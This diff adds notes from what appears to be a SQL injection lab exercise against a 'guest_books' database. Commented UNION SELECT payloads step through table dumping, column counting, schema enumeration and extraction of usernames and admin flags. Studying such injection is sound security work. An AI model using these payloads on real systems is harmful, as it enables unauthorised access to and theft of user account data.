@@ -1,0 +1,12 @@
+dd - test scenario one
+rr - test scenario two
+%';#' - getting all data from the table
+' UNION (SELECT 1,2,3,4,5 FROM DUAL);#  - we only test if we can execute other queries
+                                        - we also know how many columns we need (if didn't already)
+' UNION (SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE,5 FROM information_schema.tables);#
+                                        - we see all the information about existing tables and databases
+                                        - (know we know we work on guest_books db and that there are 2 tables books and users)
+' UNION (SELECT * FROM books);# - now we can actually see all the books
+' UNION (SELECT COLUMN_NAME,2,3,4,5 FROM information_schema.columns WHERE TABLE_NAME = 'users');#
+                                        - bcs. we don't know how many columns or what columns table users has, we have to find out first
+' UNION (SELECT username,isAdmin,3,4,5 FROM users);# - our sql injection attack is final and know we know all user accounts
